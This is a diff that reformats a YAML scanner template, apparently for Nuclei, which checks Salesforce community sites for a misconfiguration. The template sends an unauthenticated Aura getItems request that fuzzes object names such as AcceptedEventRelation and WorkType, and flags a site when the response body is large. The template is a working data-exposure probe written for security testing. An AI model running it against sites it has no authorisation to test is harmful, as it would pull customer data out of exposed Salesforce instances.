@@ -1,23 +1,24 @@
 id: salesforce-misconfiguration
-
 info:
   name: Salesforce Misconfiguration
   author: shelled
   severity: high
-  description: Misconfigured Salesforce configuration allows unauthenticated attackers to fetch sensitive data.
+  description: |
+    Misconfigured Salesforce configuration allows unauthenticated attackers to
+    fetch sensitive data.
   reference:
-    - https://www.varonis.com/blog/abusing-salesforce-communities
-  tags: salesforce, misconfiguration, data-exposure
-
+    - 'https://www.varonis.com/blog/abusing-salesforce-communities'
+  tags: 'salesforce, misconfiguration, data-exposure'
 requests:
   - raw:
-      - | 
+      - |
         POST /s/sfsites/aura HTTP/1.1
         Host: {{Hostname}}
-        
+
         message=%7b%22actions%22%3a%5b%7b%22id%22%3a%22123%3ba%22%2c%22descriptor%22%3a%22serviceComponent%3a%2f%2fui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController%2fACTION%24getItems%22%2c%22callingDescriptor%22%3a%22UNKNOWN%22%2c%22params%22%3a%7b%22entityNameOrId%22%3a%22{{fuzz}}%22%2c%22layoutType%22%3a%22FULL%22%2c%22pageSize%22%3a100%2c%22currentPage%22%3a0%2c%22useTimeout%22%3afalse%2c%22getCount%22%3afalse%2c%22enableRowActions%22%3afalse%7d%7d%5d%7d&aura.context=%7B%22mode%22%3A%22PROD%22%2C%22fwuid%22%3A%22tr2UlkrAHzi37ijzEeD2UA%22%2C%22app%22%3A%22siteforce%3AcommunityApp%22%2C%22loaded%22%3A%7B%22APPLICATION%40markup%3A%2F%2Fsiteforce%3AcommunityApp%22%3A%22K0V8802f_xC9u_ipYQN2Rg%22%7D%2C%22dn%22%3A%5B%5D%2C%22globals%22%3A%7B%7D%2C%22uad%22%3Afalse%7D&aura.token=null
-        
+
         attack: batteringram
+
         payloads:
           fuzz:
             - AcceptedEventRelation
@@ -1233,13 +1234,11 @@ requests:
             - WorkType
             - WorkTypeGroup
             - WorkTypeGroupMember
-
     matchers-condition: and
     matchers:
       - type: status
         status:
           - 200
-
       - type: dsl
         dsl:
-          - "len(body) >= 10000"
+          - len(body) >= 10000
